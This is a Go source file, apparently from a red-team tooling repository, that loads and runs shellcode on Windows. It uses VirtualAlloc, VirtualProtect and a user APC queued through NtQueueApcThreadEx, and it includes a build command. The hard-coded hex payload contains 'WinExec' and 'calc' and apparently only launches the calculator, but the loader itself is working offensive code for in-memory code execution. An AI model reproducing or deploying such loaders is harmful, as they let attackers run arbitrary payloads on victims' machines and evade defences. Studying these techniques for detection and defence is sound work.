// +build windows

/*
This program executes shellcode in the current process using the following steps
	1. Allocate memory for the shellcode with VirtualAlloc setting the page permissions to Read/Write
	2. Use the RtlCopyMemory macro to copy the shellcode to the allocated memory space
	3. Change the memory page permissions to Execute/Read with VirtualProtect
	4. Get a handle to the current thread
	4. Execute the shellcode in the current thread by creating a "Special User APC" through the NtQueueApcThreadEx function

References:
	1. https://repnz.github.io/posts/apc/user-apc/
	2. https://docs.rs/ntapi/0.3.1/ntapi/ntpsapi/fn.NtQueueApcThreadEx.html
	3. https://0x00sec.org/t/process-injection-apc-injection/24608
	4. https://twitter.com/aionescu/status/992264290924032005
	5. http://www.opening-windows.com/techart_windows_vista_apc_internals2.htm#_Toc229652505

*/

package main

import (
	"log"

	sc "github.com/cauefcr/go-shellcode"
)

func main() {
	err := sc.RunSCNTqueueApcThreadExLocal("505152535657556A605A6863616C6354594883EC2865488B32488B7618488B761048AD488B30488B7E3003573C8B5C17288B741F204801FE8B541F240FB72C178D5202AD813C0757696E4575EF8B741F1C4801FE8B34AE4801F799FFD74883C4305D5F5E5B5A5958C3", 2)
	if err != nil {
		log.Panic(err)
	}
}

// export GOOS=windows GOARCH=amd64;go build -o goNtQueueApcThreadEx-Local.exe cmd/NtQueueApcThreadEx-Local/main.go
